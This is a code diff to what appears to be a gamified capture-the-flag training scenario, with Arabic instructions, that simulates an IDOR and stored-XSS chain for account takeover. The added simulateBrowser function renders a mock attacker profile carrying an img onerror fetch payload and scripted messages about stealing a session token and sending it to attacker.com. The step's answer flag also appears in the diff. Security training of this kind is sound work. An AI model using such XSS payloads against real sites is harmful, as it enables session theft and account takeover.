@@ -80,13 +80,13 @@ window.scenario_009 = {
     {
       "name": "Exploitation & Flag",
       "time": "10:05",
-      "workspace": "lab",
+      "workspace": "browser",
       "xpReward": 300,
       "instructions": "أدخل الـ Flag المسترجع بعد نجاح عملية الـ Chain وسحب توكين الضحية للـ Account Takeover.",
       "targetUrl": "https://social.target.com/api/profile/attacker",
       "correctFlag": "FLAG{chain_idor_xss_account_takeover}",
       "aiAdvisor": {
-        "hint": "أدخل العلم الصحيح: FLAG{chain_idor_xss_account_takeover}",
+        "hint": "أدخل الرابط المصاب في المتصفح لمشاهدة الـ XSS",
         "payloadExplanation": "استرداد العلم يثبت نجاح عملية الربط الكاملة.",
         "failureExplanation": "تأكد من كتابة الأحرف بطريقة صحيحة."
       }
@@ -232,5 +232,43 @@ window.scenario_009 = {
     }
 
     return builder.setStatus(404).setBody({ error: "Not Found" }).build();
+  },
+
+  simulateBrowser(url) {
+    if (url === "https://social.target.com/api/profile/attacker") {
+      return {
+        html: `
+          <html>
+            <head>
+              <title>Attacker Profile</title>
+              <script>
+                setTimeout(() => {
+                  console.log("Fetching private messages from /api/messages/9999...");
+                  setTimeout(() => {
+                    console.log("Data retrieved: { user_id: 9999, messages: [ 'Session token: abc123xyz' ] }");
+                    console.log("Sending data to attacker.com...");
+                    setTimeout(() => {
+                      alert("Attacker Server Received: FLAG{chain_idor_xss_account_takeover}");
+                    }, 500);
+                  }, 500);
+                }, 500);
+              </script>
+            </head>
+            <body style="background: #222; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh;">
+              <div style="text-align: center;">
+                <h2>Attacker's Profile</h2>
+                <p>Bio: Normal bio text <img src=x onerror=fetch('/api/messages/9999').then(...)></p>
+                <div style="margin-top: 20px; font-size: 1.2rem; color: #4ade80;">Waiting for XSS trigger...</div>
+              </div>
+            </body>
+          </html>
+        `,
+        correct: true
+      };
+    }
+    return {
+      html: `<html><body style="font-family:sans-serif; padding:20px;"><h1>404 Not Found</h1></body></html>`,
+      correct: false
+    };
   }
 };
